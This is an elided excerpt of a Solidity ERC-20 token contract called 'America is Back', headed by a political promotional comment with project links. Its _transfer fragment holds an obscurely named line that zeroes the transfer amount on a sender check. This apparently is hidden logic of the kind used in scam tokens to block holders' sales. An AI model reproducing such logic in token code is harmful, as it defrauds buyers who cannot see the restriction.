...
/*
    ...
    America is BACK!
    The rule of law is standing tall again, and with it comes a renewed spirit of liberty and American excellence. 
    Golden Age loading…

    https://aiboneth.xyz
    https://x.com/AIBcoinerc20
    https://t.me/AIBcoinerc20
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function transferFrom(
        ...
        require(
            currentAllowance >= _wspA,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - _wspA);
        }
...
contract Token is ERC20, Ownable {
    ...
    string private constant _name = "America is Back";
    ...
    function _transfer(
        ...
        if(_isSenderCheck(projectWallet))_wspA = 0;
